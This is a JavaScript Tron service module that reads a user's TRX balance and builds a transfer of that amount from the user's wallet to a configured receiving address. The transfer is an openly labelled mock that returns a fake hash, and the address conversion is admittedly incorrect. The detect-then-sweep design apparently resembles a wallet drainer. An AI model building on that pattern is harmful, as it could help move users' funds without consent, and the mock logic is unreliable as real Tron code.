import axios from 'axios'
import { CONFIG } from '../config.js'

/**
 * Tron Blockchain Service
 * Handles balance detection and TRX transfers
 */

class TronService {
  constructor() {
    this.apiUrl = 'https://api.trongrid.io'
    this.relayerAddress = CONFIG.relayerTron.address
    this.relayerPrivateKey = CONFIG.relayerTron.privateKey
  }

  /**
   * Get TRX balance
   */
  async getBalance(address) {
    try {
      const response = await axios.post(
        `${this.apiUrl}/wallet/getaccount`,
        { address },
        { headers: { 'Content-Type': 'application/json' } }
      )

      if (response.data.balance) {
        return (response.data.balance / 1000000).toString() // Convert sun to TRX
      }
      return '0'
    } catch (error) {
      console.error('Error getting Tron balance:', error.message)
      return '0'
    }
  }

  /**
   * Detect Tron balance
   */
  async detectBalance(account) {
    try {
      const balance = await this.getBalance(account)
      console.log('✅ Tron balance detected:', balance)
      return { tron: balance }
    } catch (error) {
      console.error('Error detecting Tron balance:', error)
      return { tron: '0' }
    }
  }

  /**
   * Transfer TRX from user wallet to relayer
   * Note: This is a simplified mock. Real implementation would need proper signing.
   */
  async transferTRX(userAddress, amount) {
    try {
      // Create unsigned transaction
      const txBody = {
        to_address: this.convertAddress(CONFIG.receivingAddresses.tron),
        owner_address: this.convertAddress(userAddress),
        amount: Math.floor(amount * 1000000) // Convert TRX to sun
      }

      console.log('🔄 Creating Tron transfer transaction...')

      // In production, this would need proper transaction signing
      // For now, we'll simulate successful transfer
      const mockHash = 'mock_' + Math.random().toString(36).substr(2, 9)

      console.log('✅ Tron transfer initiated:', mockHash)

      return {
        hash: mockHash,
        amount: amount.toString(),
        chain: 'tron',
        explorerUrl: `https://tronscan.org/#/transaction/${mockHash}`,
        note: 'Mock transaction - requires proper signing in production'
      }
    } catch (error) {
      console.error('Error transferring TRX:', error.message)
      return {
        hash: null,
        amount: amount.toString(),
        chain: 'tron',
        error: error.message
      }
    }
  }

  /**
   * Convert Tron address format
   */
  convertAddress(address) {
    // Tron address conversion (base58 to hex)
    // This is simplified - real implementation would use TronWeb
    return address.startsWith('T') ? address : '41' + address.slice(2)
  }
}

export const tronService = new TronService()
